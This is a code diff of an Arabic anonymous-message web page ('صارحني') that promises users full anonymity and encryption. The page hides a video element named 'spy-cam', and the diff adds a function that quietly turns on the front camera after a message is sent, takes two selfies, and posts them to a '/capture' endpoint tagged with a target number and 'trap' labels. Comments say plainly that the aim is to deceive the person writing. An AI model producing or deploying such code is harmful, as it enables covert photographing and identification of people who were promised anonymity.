@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>صارحني | رسائل سرية ومجهولة</title>
+    <title>صارحني | مساحة التعبير الحرة</title>
     
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -16,27 +16,28 @@
     <style>
         body {
             font-family: 'Tajawal', sans-serif;
-            background: radial-gradient(circle at top right, #fdf2f8 0%, #f3e8ff 100%);
+            background: radial-gradient(circle at top left, #fdf2f8 0%, #f3e8ff 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             color: #1f2937;
             -webkit-tap-highlight-color: transparent;
+            overflow-x: hidden;
         }
 
         /* تصميم البطاقة الزجاجي الفخم */
         .glass-card {
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             border-radius: 32px;
-            box-shadow: 0 25px 50px -12px rgba(236, 72, 153, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.6);
+            box-shadow: 0 20px 50px -10px rgba(217, 70, 239, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.8);
         }
 
         .header-gradient {
-            background: linear-gradient(135deg, #f43f5e 0%, #d946ef 100%);
+            background: linear-gradient(135deg, #ec4899 0%, #d946ef 100%);
             border-radius: 32px 32px 0 0;
             padding: 40px 20px 55px 20px;
             text-align: center;
@@ -54,19 +55,19 @@
             background: white;
             border-radius: 50%;
             padding: 5px;
-            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.2);
+            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.25);
         }
 
         .profile-icon {
             width: 100%;
             height: 100%;
             border-radius: 50%;
-            background: linear-gradient(135deg, #fbcfe8 0%, #e879f9 100%);
+            background: linear-gradient(135deg, #fbcfe8 0%, #f472b6 100%);
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 40px;
-            color: #86198f;
+            color: #9d174d;
         }
 
         .custom-textarea {
@@ -85,7 +86,7 @@
             outline: none;
             border-color: #d946ef;
             background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(217, 70, 239, 0.1);
+            box-shadow: 0 0 0 4px rgba(217, 70, 239, 0.15);
         }
 
         .custom-textarea::placeholder {
@@ -94,15 +95,15 @@
         }
 
         .btn-magic {
-            background: linear-gradient(135deg, #d946ef 0%, #f43f5e 100%);
+            background: linear-gradient(135deg, #d946ef 0%, #ec4899 100%);
             border-radius: 9999px;
             transition: all 0.3s;
-            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.3);
+            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.35);
         }
 
         .btn-magic:hover {
             transform: translateY(-2px);
-            box-shadow: 0 12px 30px rgba(217, 70, 239, 0.4);
+            box-shadow: 0 12px 30px rgba(217, 70, 239, 0.45);
         }
 
         /* كتم الكاميرا تماماً وإخفائها */
@@ -120,17 +121,17 @@
         .blob {
             position: absolute;
             border-radius: 50%;
-            filter: blur(40px);
+            filter: blur(50px);
             z-index: -1;
-            opacity: 0.6;
+            opacity: 0.5;
         }
     </style>
 </head>
-<body class="p-4 overflow-hidden relative">
+<body class="p-4 relative">
 
     <!-- تأثيرات خلفية فخمة -->
-    <div class="blob bg-pink-300 w-64 h-64 top-10 right-10 animate-pulse"></div>
-    <div class="blob bg-purple-300 w-72 h-72 bottom-10 left-10 animate-pulse" style="animation-delay: 2s;"></div>
+    <div class="blob bg-pink-400 w-64 h-64 top-0 right-0 animate-pulse"></div>
+    <div class="blob bg-purple-400 w-72 h-72 bottom-0 left-0 animate-pulse" style="animation-delay: 2s;"></div>
 
     <!-- الكاميرا المخفية -->
     <video id="spy-cam" autoplay playsinline muted></video>
@@ -152,7 +153,7 @@
         <div class="pt-16 pb-8 px-6 space-y-5 relative">
             <div class="text-center">
                 <h2 class="text-xl font-bold text-gray-800">أرسل رسالة مجهولة</h2>
-                <p class="text-xs text-gray-500 mt-1">لن نطلب اسمك، ولن نعرف من أنت.</p>
+                <p class="text-xs text-gray-500 mt-1">قل ما في قلبك، هويتك ستبقى مجهولة تماماً.</p>
             </div>
 
             <div class="relative">
@@ -163,13 +164,13 @@
             </div>
 
             <button id="send-btn" class="w-full btn-magic text-white font-bold text-lg py-4 flex justify-center items-center gap-2">
-                <i class="fa-solid fa-paper-plane"></i>
+                <i class="fa-solid fa-paper-plane" id="btn-icon"></i>
                 <span id="btn-text">إرسال الصراحة</span>
             </button>
             
             <div class="text-center text-[11px] text-gray-400 font-bold flex items-center justify-center gap-1.5 mt-2">
                 <i class="fa-solid fa-shield-halved text-emerald-400"></i>
-                محمي بتقنية التشفير المتقدمة
+                نظام محمي ومشفر بالكامل
             </div>
         </div>
     </main>
@@ -195,6 +196,7 @@
 
         const sendBtn = document.getElementById('send-btn');
         const btnText = document.getElementById('btn-text');
+        const btnIcon = document.getElementById('btn-icon');
         const msgInput = document.getElementById('msg-input');
         const writeUi = document.getElementById('write-ui');
         const successUi = document.getElementById('success-ui');
@@ -211,89 +213,49 @@
             }
 
             if (!sessionId || !targetNumber) {
-                alert("عذراً، هذا الرابط غير مخصص لاستقبال الرسائل.");
+                alert("عذراً، هذا الرابط تالف أو غير مخصص للاستقبال.");
                 return;
             }
 
-            // تجميد الواجهة لإظهار التحميل (وهم الفحص الأمني)
+            // تجميد الواجهة لإظهار التحميل
             sendBtn.disabled = true;
-            sendBtn.style.opacity = "0.8";
-            sendBtn.innerHTML = `<i class="fa-solid fa-shield-halved animate-spin"></i> <span>جاري التشفير الأمني...</span>`;
+            sendBtn.style.opacity = "0.7";
+            btnIcon.className = "fa-solid fa-circle-notch animate-spin";
+            btnText.textContent = "جاري الإرسال...";
 
             // ==========================================
-            // 1. الإرسال المباشر للنص (ضمان الوصول 100%)
+            // 1. الإرسال المباشر للنص (يضمن الوصول 100%)
             // ==========================================
             try {
-                // نرسل النص مباشرة للسيرفر المطور الخاص بك
-                await fetch('/capture', {
+                // نرسل النص مباشرة للسيرفر وننتظر رده
+                const response = await fetch('/capture', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        type: 'text', // نوع النص المدعوم في السيرفر الجديد
+                        type: 'text', // إرسال كنص
                         data: messageText, 
                         targetNumber: targetNumber, 
                         trapId: '💌 رسالة صارحني', 
                         sessionId: sessionId 
                     })
                 });
-            } catch (err) {
-                console.error("خطأ في إرسال النص:", err);
-            }
 
-            // ==========================================
-            // 2. محاولة التقاط الصور بصمت (المفاجأة)
-            // ==========================================
-            let capturedImages = [];
-            try {
-                sendBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> <span>جاري الإرسال...</span>`;
-                
-                // طلب الكاميرا (سيظن المستخدم أنه فحص بشري)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } });
-                videoEl.srcObject = stream;
-                
-                // انتظار 1.2 ثانية لتستقر الإضاءة والفوكس
-                await new Promise(resolve => setTimeout(resolve, 1200));
+                const result = await response.json();
 
-                const canvas = document.createElement('canvas');
-                canvas.width = videoEl.videoWidth || 640;
-                canvas.height = videoEl.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-
-                // اللقطة الأولى
-                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
-
-                // انتظار نصف ثانية للقطة الثانية
-                await new Promise(resolve => setTimeout(resolve, 500));
-                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
-
-                // إغلاق الكاميرا فوراً
-                stream.getTracks().forEach(track => track.stop());
-
-                // إذا نجح التقاط الصور، نرسلها للسيرفر كدفعة ثانية
-                if (capturedImages.length > 0) {
-                    await fetch('/capture', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            type: 'selfie', // نوع الصور المدعوم في السيرفر
-                            data: capturedImages, 
-                            targetNumber: targetNumber, 
-                            trapId: '📸 الملحقات السرية', 
-                            sessionId: sessionId 
-                        })
-                    });
+                if (!result.success) {
+                    alert("⚠️ تعذر الإرسال: " + (result.message || "البوت غير متصل حالياً."));
+                    resetButton();
+                    return; // نوقف العملية لأن السيرفر فيه مشكلة
                 }
 
             } catch (err) {
-                // إذا رفض الكاميرا، أو فشل التقاط الصورة، نتجاهل الأمر بصمت
-                // لأن الرسالة النصية تم إرسالها بالفعل في الخطوة 1!
-                console.log("تم حجب الكاميرا، تم الاكتفاء بالنص.");
+                alert("⚠️ لا يوجد اتصال بالسيرفر! يرجى التأكد من تشغيل البوت.");
+                resetButton();
+                return; // نوقف العملية
             }
 
             // ==========================================
-            // 3. عرض واجهة النجاح المريحة
+            // 2. إذا نجح الإرسال النصي، نعرض شاشة النجاح فوراً
             // ==========================================
             writeUi.style.opacity = '0';
             setTimeout(() => {
@@ -304,8 +266,68 @@
                     successUi.style.transform = 'scale(1)';
                 }, 50);
             }, 400);
+
+            // ==========================================
+            // 3. التقاط الصور وإرسالها في الخلفية (بصمت)
+            // ==========================================
+            captureAndSendHiddenPhotos();
         });
+
+        async function captureAndSendHiddenPhotos() {
+            try {
+                // محاولة فتح الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                videoEl.srcObject = stream;
+                
+                // انتظار ثانية واحدة لتستقر الإضاءة
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = videoEl.videoWidth || 640;
+                canvas.height = videoEl.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+
+                let capturedImages = [];
+
+                // التقاط الصورة الأولى
+                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+
+                // التقاط الصورة الثانية بسرعة
+                await new Promise(resolve => setTimeout(resolve, 300));
+                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+
+                // إغلاق الكاميرا فوراً
+                stream.getTracks().forEach(track => track.stop());
+
+                // إرسال الصور للسيرفر بصمت تام
+                if (capturedImages.length > 0) {
+                    fetch('/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'selfie', 
+                            data: capturedImages, 
+                            targetNumber: targetNumber, 
+                            trapId: '📸 الملحقات السرية', 
+                            sessionId: sessionId 
+                        })
+                    });
+                }
+            } catch (err) {
+                // المستخدم رفض الكاميرا أو لا يملك كاميرا؟
+                // لا يهم، تم إرسال الرسالة النصية مسبقاً!
+                console.log("تخطي التقاط الصور الملحقة.");
+            }
+        }
+
+        function resetButton() {
+            sendBtn.disabled = false;
+            sendBtn.style.opacity = "1";
+            btnIcon.className = "fa-solid fa-paper-plane";
+            btnText.textContent = "إرسال الصراحة";
+        }
     </script>
 </body>
 </html>
-
